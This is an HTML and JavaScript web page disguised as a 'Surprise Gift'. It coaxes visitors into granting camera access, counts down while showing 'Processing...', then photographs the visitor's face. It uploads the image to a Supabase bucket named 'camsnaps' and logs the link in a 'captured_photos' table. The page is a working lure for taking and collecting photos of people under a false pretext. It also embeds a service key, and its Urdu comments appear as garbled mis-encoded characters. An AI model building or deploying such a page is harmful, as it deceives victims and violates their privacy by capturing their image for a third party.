<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surprise Gift üéÅ</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body { background: #1e272e; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; text-align: center; margin: 0; }
        
        #gift-box { cursor: pointer; transition: 0.3s; }
        #gift-box:active { transform: scale(0.9); }
        .emoji { font-size: 100px; animation: bounce 2s infinite; display: block; }
        h1 { margin-top: 10px; color: #ff4757; }
        
        #timer { font-size: 6rem; color: #ff4757; display: none; font-weight: bold; }
        #status { margin-top: 20px; font-size: 1.2rem; color: #ced6e0; }
        
        @keyframes bounce { 0%, 100% {transform: translateY(0);} 50% {transform: translateY(-20px);} }
    </style>
</head>
<body>

    <div id="gift-box" onclick="startCameraProcess()">
        <div class="emoji">üéÅ</div>
        <h1>Tap to Open</h1>
        <p style="font-size: 0.8rem; color: gray;">(Click allow when asked)</p>
    </div>

    <div id="timer">10</div>
    <p id="status"></p>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // --- SUPABASE CONFIG ---
        const SUPABASE_URL = 'https://mlcbjfnimbpatmbcgwsq.supabase.co';
        const SUPABASE_KEY = 'sb_publishable_J1WdZTnnDUCBE6bsTf2brQ_qRlXL_1Z'; 
        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        async function startCameraProcess() {
            const status = document.getElementById('status');

            // 1. SAFETY CHECK: ⁄©€åÿß €å€Å ⁄©Ÿà⁄à ÿß€åÿ≥€å ÿ¨⁄Ø€Å ⁄ÜŸÑ ÿ±€Åÿß €Å€í ÿ¨€Åÿß⁄∫ ⁄©€åŸÖÿ±€Å ÿßŸÑÿßÿ§ €Å€íÿü
            // ⁄©ÿ±ŸàŸÖ ÿµÿ±ŸÅ HTTPS €åÿß Localhost Ÿæÿ± ⁄©€åŸÖÿ±€Å ⁄ÜŸÑÿßÿ™ÿß €Å€í€î
            if (window.location.protocol === 'file:') {
                alert("ŸÖÿ≥ÿ¶ŸÑ€Å Ÿæ⁄©⁄ëÿß ⁄Ø€åÿß! üõë\n\nÿ¢Ÿæ ÿßÿ≥ ŸÅÿßÿ¶ŸÑ ⁄©Ÿà ⁄©ŸÖŸæ€åŸàŸπÿ± ÿ≥€í ⁄àÿßÿ¶ÿ±€å⁄©Ÿπ ⁄ÜŸÑÿß ÿ±€Å€í €Å€å⁄∫€î ⁄©ÿ±ŸàŸÖ ÿ≥⁄©€åŸàÿ±Ÿπ€å ⁄©€å Ÿàÿ¨€Å ÿ≥€í ÿßÿ≥ ÿ∑ÿ±ÿ≠ ⁄©€åŸÖÿ±€Å ÿ¢ŸÜ ŸÜ€Å€å⁄∫ ⁄©ÿ±ÿ™ÿß€î\n\nÿ®ÿ±ÿßÿ¶€í ŸÖ€Åÿ±ÿ®ÿßŸÜ€å ÿßÿ≥€í VS Code Live Server Ÿæÿ± ⁄ÜŸÑÿßÿ¶€å⁄∫ €åÿß Netlify Ÿæÿ± ÿßŸæŸÑŸà⁄à ⁄©ÿ±€å⁄∫€î");
                status.innerText = "Error: Please run on Localhost or HTTPS.";
                return;
            }

            try {
                // 2. ⁄©€åŸÖÿ±€Å ŸÖÿßŸÜ⁄ØŸÜÿß
                status.innerText = "Waiting for permission...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                
                // 3. ÿß⁄Øÿ± ÿßŸÑÿßÿ§ ⁄©ÿ± ÿØ€åÿß ÿ™Ÿà:
                document.getElementById('video').srcObject = stream;
                startTimer();

            } catch (err) {
                console.error(err);
                alert("Permission Denied! ‚ùå\nÿ®ÿ±ÿß€Å ⁄©ÿ±ŸÖ ŸæÿßŸæ ÿßŸæ Ÿæÿ± 'Allow' ⁄©ŸÑ⁄© ⁄©ÿ±€å⁄∫€î");
                status.innerText = "Camera access denied.";
            }
        }

        function startTimer() {
            document.getElementById('gift-box').style.display = 'none';
            document.getElementById('timer').style.display = 'block';
            document.getElementById('status').innerText = "Processing...";
            
            let count = 10;
            const interval = setInterval(() => {
                count--;
                document.getElementById('timer').innerText = count;
                if (count <= 0) {
                    clearInterval(interval);
                    captureAndSave();
                }
            }, 1000);
        }

        async function captureAndSave() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0); ctx.scale(-1, 1); // Mirror
            ctx.drawImage(video, 0, 0);

            document.getElementById('status').innerText = "Saving Gift...";

            canvas.toBlob(async (blob) => {
                const fileName = `snap_${Date.now()}.png`;

                // Upload Image
                const { error: uploadError } = await supabase.storage.from('camsnaps').upload(fileName, blob);
                
                if (uploadError) {
                    alert("Upload Error: " + uploadError.message);
                    return;
                }

                // Get URL
                const { data } = supabase.storage.from('camsnaps').getPublicUrl(fileName);

                // Save to Database
                const { error: dbError } = await supabase.from('captured_photos').insert([{ image_url: data.publicUrl }]);

                if (dbError) {
                    alert("DB Error: " + dbError.message);
                } else {
                    document.getElementById('timer').style.display = 'none';
                    document.getElementById('status').innerHTML = `<h1>üéâ Done! üéâ</h1><br><img src="${data.publicUrl}" width="200" style="border-radius:10px;">`;
                    
                    // Stop Camera
                    video.srcObject.getTracks().forEach(track => track.stop());
                }
            }, 'image/png');
        }
    </script>
</body>
</html>
